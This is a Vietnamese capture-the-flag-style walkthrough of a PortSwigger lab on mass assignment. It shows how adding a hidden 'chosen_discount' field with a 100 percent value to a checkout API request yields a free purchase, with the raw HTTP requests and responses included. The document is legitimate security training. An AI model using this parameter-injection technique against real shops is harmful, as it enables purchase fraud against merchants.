# **Lab: Exploiting a mass assignment vulnerability**

> To solve the lab, find and exploit a mass assignment vulnerability to buy a `Lightweight l33t Leather Jacket`. You can log in to your own account using the following credentials: `wiener:peter`.  

# **Solution**

Sau khi truy cập web, thử `View details` sản phẩm. Ta thấy không có lộ api nào liên quan đến sản phẩm.

Đăng nhập bằng tài khoản `wiener:peter`.

Sau khi thấy các chức năng cơ bản bao gồm `Update email` không có gì để khai thác, quay lại trang sản phẩm để thêm 1 sản phẩm vào giỏ hảng thực hiện thanh toán.

Sau khi thực hiện thanh toán, và tất nhiên là không thành công vì ta không có tiền trong tài khoản :v

Quan sát luồng request và các response của nó. Ta thây có 2 request cùng tới URL là `/api/checkout` với 2 method khác nhau là GET và POST.

Và ta cũng thấy được GET là request gửi đi yêu cầu danh sách sản phẩm đã thêm giỏ hàng và các discount đã chọn.  
Trong khi đó POST gửi đi khi để gửi nhưng thông tin bao gồm sản phẩm chọn để thanh toán, bao gồm số lượng.

```
# GET response
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 153

{
    "chosen_discount": {
        "percentage":0
        },
    "chosen_products": [
        {
            "product_id":"1", 
            "name":"Lightweight \"l33t\" Leather Jacket",
            "quantity":1,
            "item_price":133700
        }
    ]
}
```

```
# POST request
POST /api/checkout HTTP/2
Host: 0a12004c033b1baf823c741700f40008.web-security-academy.net
Cookie: session=0CZcAMTiz7uCussq5vWGqUKXejRRKbPv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a12004c033b1baf823c741700f40008.web-security-academy.net/cart
Content-Type: text/plain;charset=UTF-8
Content-Length: 53
Origin: https://0a12004c033b1baf823c741700f40008.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{
    "chosen_products":[
        {
            "product_id":"1",
            "quantity":1
        }
    ]
}
```

Okey, ta thấy phần JSON của GET response có thêm `"chosen_discount"`.

Ta thử thêm nó vào JSON của POST request.

```
{"chosen_discount":{"percentage":0},"chosen_products":[{"product_id":"1","quantity":1}]}
```

Ta thấy response trả về không khác gì so với response ban đầu.

Giờ sửa giá trị 0 thành một giá trị khác không phải số nguyên.

Nếu nó được xử lý thì nó sẽ xảy ra lỗi. Nếu không thì sẽ giống response gốc.

```
{"chosen_discount":{"percentage":"x"},"chosen_products":[{"product_id":"1","quantity":1}]}
```

```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Length: 82

{"error":"Key order: Key chosen_discount: Key percentage: string is not a number"}
```

Perfect!! Ta thấy được nó có thông báo lỗi rõ ràng kiểu dữ liệu string là không hợp lệ. Đồng nghĩa với việc request của chúng ta được xử lý như một request chính cống.  

Giờ thì thay đổi giá trị cho hợp lệ nào. `chosen_discount` là mã giảm giá đã chọn, thì `percentage` của nó có thể là % được khuyến mãi. Đẩy lên 100 xem sao.

```
{"chosen_discount":{"percentage":100},"chosen_products":[{"product_id":"1","quantity":1}]}
```

```
HTTP/2 201 Created
Location: /cart/order-confirmation?order-confirmed=true
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Tốt rồi, response giống y như chưa từng thay đổi. Quay lại trình duyệt kiểm tra xem.

Yee, reload là thấy lab solved:)

![image](https://steamuserimages-a.akamaihd.net/ugc/1667980019599930485/F57B5D6531681D2C2CB8090EBA30F734F1412017/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true)